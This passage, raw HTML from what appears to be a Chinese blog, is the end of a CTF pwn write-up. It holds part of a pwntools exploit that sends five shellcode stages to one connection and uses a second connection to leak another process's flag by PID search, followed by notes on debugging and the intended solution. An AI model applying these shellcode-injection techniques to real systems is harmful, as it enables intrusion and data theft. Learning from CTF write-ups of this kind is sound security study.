style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc1</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc2</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc3</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc4</span><span style="color:#5eaab5">)</span><br><span style="color:#B8A965">print</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res1 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res1</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">p2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res2</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">p2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc3</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res3 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res3</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">p2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc4</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res4 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res4</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">p2 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> getio</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/5):</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">sc5</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">search</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">res5 </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvline</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">p2</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">close</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">res5</span><span style="color:#5eaab5">)</span><br><span style="color:#758575DD">#</span><br><span style="color:#DBD7CAEE">p1</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>exp 如上，我实现的 <code class="inline-code">search_flag</code> 函数可以生成一个在 <code class="inline-code">[start_pid, end_pid]</code> 范围内用于搜索目标进程的 PID 的 shellcode，如果搜到了就打印出来，并且把当前这个进程 B 的 flag.txt 用 orw 打印出来（“now flag”），只需要对比这俩一不一样就知道泄漏成功了没有（如果一样说明读到自己了）。</p>
<p>然后就是很折磨的调试循环次数，一直调，我刚打这题的时候 pid 只有 1000 左右，后面打到 8000 了直接。。。经常是对 4 个错一个。</p>
<p>去找主办方重启了一下远程靶机，然后试了一会就出了。</p>
<p>泄漏出来的五组 flag 碎片直接扔给 AI 恢复即可。</p>
<p><img src="https://pic1.imgdb.cn/item/691192fb3203f7be00ed228c.png" alt/></p>
<p>这个题预期解是：</p>
<blockquote>
<p>Each payload needed a unique way of jumping back to the start so you can use <code class="inline-code">jmp &lt;reg>, ret, ret XXX, retfq, retfq XXX</code> (using 0x49 instead of 0x48 as the first byte).</p>
</blockquote>
<h2 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>后记</a></h2>
<p><img src="https://pic1.imgdb.cn/item/691193263203f7be00ed22a4.png" alt/></p>
<blockquote>
<p>👴：黑子说话用英语怎么说 有没有人懂.jpg</p>
</blockquote></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
<a href="https://github.com/unvariant/blog">unvariant/blog</a>
改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>